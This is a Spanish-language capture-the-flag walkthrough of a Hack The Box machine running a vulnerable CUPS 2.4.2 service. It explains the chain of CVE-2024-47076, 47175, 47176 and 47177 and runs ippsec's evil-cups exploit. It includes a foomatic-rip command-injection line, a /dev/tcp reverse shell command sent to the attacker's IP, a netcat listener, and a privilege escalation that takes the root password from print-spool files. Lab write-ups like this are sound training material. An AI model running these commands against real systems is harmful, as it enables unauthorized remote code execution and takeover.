Empezamos la máquina realizando un escaneo para ver los puertos abiertos en la máquina víctima:
nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.11.40 -oN target

| Opción            | Descripción                                                                                        |
| ----------------- | -------------------------------------------------------------------------------------------------- |
| `sudo`            | Ejecuta el comando con privilegios de superusuario, necesarios para realizar un escaneo con Nmap.  |
| `nmap`            | Inicia el programa Nmap, una herramienta para escanear puertos y redes.                            |
| `-p-`             | Escanea todos los puertos (del 1 al 65535).                                                        |
| `--open`          | Muestra solo los puertos que están abiertos.                                                       |
| `-sS`             | Realiza un escaneo SYN, que es rápido y sigiloso, enviando paquetes SYN sin completar la conexión. |
| `--min-rate 5000` | Establece una tasa mínima de envío de paquetes de 5000 por segundo, acelerando el escaneo.         |
| `-n`              | Evita la resolución de nombres DNS para agilizar el proceso.                                       |
| `-Pn`             | Desactiva la detección previa de host, asumiendo que el objetivo está activo.                      |

Vemos que están abiertos los puertos 22 y 631.

En un escaneo un poco más profundo para ver que versiones corren para estos puertos encontramos:
nmap -sCV 10.10.11.40

Starting Nmap 7.945VN ( https://nmap.org ) at 2024-10-21 18:56 CEST
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.90% done; ETC: 18:56 (0:00:00 remaining)
Nmap scan report for 10.10.11.40
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
| 256 36:49:95:03:8d:b4:4c:6e:a9:25:92:af:3c:9e:06:66 (ECDSA)
| 256 9f:a4:a9:39:11:20:96:ec:c4:9a:68:28:95:0c:60 (ED25519)
631/tcp open ipp CUPS 2.4
|_http-robots.txt: 1 disallowed entry
|_/ |_http-title: Home - CUPS 2.4.2

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 75.88 seconds

Realizamos un escaneo por udp para ver si este puerto está abierto, ya que la versión que vemos por el escaneo por tcp es vulnerable.
Es importante recalcar que los escaneos por udp no son tan fiables como por tcp/ip.


Accedemos a la interfaz web expuesta por el puerto 631 (CUPS)
OpenPrinting CUPS 2.4.2

The standards-based, open source printing system developed by OpenPrinting for Linux® and other Unix®-like operating systems. CUPS uses IPP Everywhere™ to support printing to local and network printers.

CUPS for Users
- Overview of CUPS
- Command-Line Printing and Options

CUPS for Administrators
- Adding Printers and Classes
- Managing Operation Policies
- Using Network Printers
- Firewalls
- cupsd.conf Reference

CUPS for Developers
- CUPS Programming Manual
- Filter and Backend Programming

Además, en la parte de printers vemos una impresora:
Printers
OpenPrinting CUPS Home Administration Classes Help Jobs Printers

Showing 1 of 1 printer.

Queue Name: Canon_MB2300_series
Description: Canon_MB2300_series
Location: Server Room
Make and Model: Local Raw Printer
Status: Idle

Con una simple búsqueda en google, podemos encontrar información acerca de exploits para la versión 2.4.2 de CUPS

En el enlace de trendmicro, tenemos explicada la cadena de vulnerabilidades en el servicio CUPS para la versión 2.4.2  https://success.trendmicro.com/en-US/solution/KA-0017905

Las condiciones que deben de cumplir para ser vulnerable a dicha cadena son:

1. El paquete cups-browsed (versión 2.0.1 o inferior) debe estar instalado.
2. El servicio cups-browsed debe estar iniciado/habilitado y escuchando en el puerto UDP 631.
3. El servidor debe ser accesible para el atacante (ya sea de cara al público en Internet o el atacante tiene acceso a la red)

Los 4 CVE asignados a está cadena de vulnerabilidades son: 

**CVE-2024-47076**: Puntuación:8.6
Severidad: Alta
https://www.cve.org/CVERecord?id=CVE-2024-47076

CUPS es un sistema de impresión de código abierto basado en estándares, y `libcupsfilters` contiene el código de los filtros del antiguo paquete `cups-filters` como funciones de biblioteca que se utilizan para las tareas de conversión de formatos de datos necesarias en las aplicaciones de impresión. La función `cfGetPrinterAttributes5` de `libcupsfilters` no desinfecta los atributos IPP devueltos por un servidor IPP. Cuando estos atributos IPP se utilizan, por ejemplo, para generar un archivo PPD, esto puede llevar a que se proporcionen datos controlados por atacantes al resto del sistema CUPS.

Enlace al commit correspondiente:
https://github.com/OpenPrinting/libcupsfilters/commit/95576ec3d20c109332d14672a807353cdc551018

**CVE-2024-47175:** Puntuación:8.6
Severidad: Alta
https://www.cve.org/CVERecord?id=CVE-2024-47175

CUPS es un sistema de impresión de código abierto basado en estándares, y `libppd` puede utilizarse para el soporte de archivos PPD heredados. La función `libppd` `ppdCreatePPPDFromIPP2` no sanea los atributos IPP al crear el buffer PPD. Cuando se utiliza en combinación con otras funciones como `cfGetPrinterAttributes5`, puede resultar en entrada controlada por el usuario y en última instancia la ejecución de código a través de Foomatic. Esta vulnerabilidad puede formar parte de una cadena de exploits que conduzca a la ejecución remota de código (RCE), como se describe en CVE-2024-47176.

Enlace al commit de parcheo:
https://github.com/OpenPrinting/libppd/commit/d681747ebf12602cb426725eb8ce2753211e2477 

**CVE-2024-47176:** Puntuación:5.3
Severidad: Medium
https://www.cve.org/CVERecord?id=CVE-2024-47176

CUPS es un sistema de impresión de código abierto basado en estándares, y `cups-browsed` contiene funcionalidad de impresión en red incluyendo, pero no limitado a, auto-descubrimiento de servicios de impresión e impresoras compartidas. `cups-browsed` se enlaza a `INADDR_ANY:631`, haciendo que confíe en cualquier paquete de cualquier origen, y puede provocar la petición IPP `Get-Printer-Attributes` a una URL controlada por el atacante. Cuando se combina con otras vulnerabilidades, como CVE-2024-47076, CVE-2024-47175 y CVE-2024-47177, un atacante puede ejecutar comandos arbitrarios de forma remota en el equipo de destino sin autenticación cuando se imprime en una impresora maliciosa.

Commit de la corrección: 
https://github.com/OpenPrinting/cups-browsed/commit/1debe6b140c37e0aa928559add4abcc95ce54aa2

**CVE-2024-47177:** Puntuación:9.1
Severidad: Crítica
https://www.cve.org/CVERecord?id=CVE-2024-47177

CUPS es un sistema de impresión de código abierto basado en estándares, y cups-filters proporciona backends, filtros y otro software para que CUPS 2.x pueda utilizarse en sistemas que no sean Mac OS. Cualquier valor pasado a `FoomaticRIPCommandLine` a través de un archivo PPD se ejecutará como un comando controlado por el usuario. Cuando se combina con otros errores lógicos como los descritos en CVE_2024-47176, esto puede llevar a la ejecución remota de comandos.

**Más información sobre correcciones a inyecciones de comandos como los de esta vulnerabilidad:** CWE-77: Neutralización incorrecta de elementos especiales utilizados en un comando ('Command Injection')
https://cwe.mitre.org/data/definitions/77.html

Una vez que hemos entendido en que consisten las vulnerabilidades que vamos a explotar, comencemos:

Tras buscar en google sobre los exploits, doy con uno de Ippsec, gran referente de habla inglesa en cuanto a resolución de máquinas. https://github.com/ippsec/evil-cups

Nos clonamos el repositorio:
git clone https://github.com/ippsec/evil-cups

Este exploit crea un servidor IPP falso y envía paquetes maliciosos a un servidor de impresión específico. El propósito es ejecutar comandos en el sistema remoto (es decir, el servidor de impresión) aprovechando  la forma en que este maneja las solicitudes de impresión. El exploit inyecta comandos arbitrarios en el filtro de impresión foomatic-rip, que es común en muchos sistemas de impresión.

Partes maliciosas del código:
Inyección de comandos en foomatic-rip:
El exploit utiliza el atributo printer-more-info para incluir una cadena que contiene un comando malicioso.

Aquí está la línea clave:
```
python
f'"\n*FoomaticRIPCommandLine: "{self.command}"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'.encode()
```

El comando que se inyecta aquí es el que se pasa como parámetro al script (sys.argv[3]). Este comando puede ser cualquier instrucción que desee ejecutar en el servidor de impresión vulnerable, lo que permite la ejecución remota de comandos en dicho servidor.

Para ejecutar el script tenemos que Instalar el archivo requeriments.txt
pip3 install -r requeriments.txt

Para ejecutar el script tenemos que indicarle la ip de la maquina atacante, la ip de la maquina victima y el comando que queremos utilizar:
En este caso una revershe shell encapsulada para que no nos de problemas.
```bash

python3 evilcups.py 10.10.14.147 10.10.11.40 "bash -c '|bash -i >& /dev/tcp/10.10.14.147/4433 0>&1'" 
```

Esperamos unos segundos hasta que se cree el servidor y se instale la impresora, a los 30 segundos paramos el script manualmente con Ctrl + C.

Vamos a comprobar que se ha instalado la impresora maliciosa entrando a la interfaz web, y vemos que está instalada, con el nombre: 

HACKED_10_10_14_147  driverless, cups-filters 1.28.17 

Nos ponemos a la escucha con netcat:
```bash
nc -nlvp 4433
```

Ahora, si imprimimos una página de prueba con la impresora maliciosa, veremos que obtenemos la reverse shell.

Ahora, vamos a intentar ganar privilegios sobre la maquina victima, lo primero es tratar la TTY para navegar más agusto por la shell

script /dev/null -c bash
stty raw -echo;fg
terminal: xterm
export TERM=xterm SHELL=bash


Sabiendo que las colas de impresión en linux se almacenan en /var/spool/cups y sabiendo que se llaman:
d000001-001 --> siendo esta la primera tarea, vamos a ver si podemos listarlo.

Haciendole un cat, podemos ver que encontramos la contraseña del usuario root.

Si hacemos un su root y pegamos la contraseña ya seremos root y podremos conseguir las 2 flags de la máquina.

https://www.hackthebox.com/achievement/machine/844512/629


